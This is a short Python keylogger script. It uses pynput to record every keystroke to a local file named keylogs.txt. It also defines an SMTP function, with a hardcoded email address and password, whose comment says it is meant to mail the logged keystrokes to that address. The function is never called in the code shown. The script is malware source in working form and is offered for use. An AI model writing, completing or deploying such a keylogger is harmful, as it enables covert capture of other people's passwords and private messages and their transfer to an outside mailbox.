import pynput.keyboard
import smtplib

# Enter your email credentials
email = "example@yahoo.com"
password = "test"

# Create a function to send email with logged keystrokes
def send_email(message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

# Create a function to log keystrokes
def on_press(key):
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        else:
            current_key = " " + str(key) + " "

    with open("keylogs.txt", "a") as f:
        f.write(current_key)

# Add listener to start logging keystrokes
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
    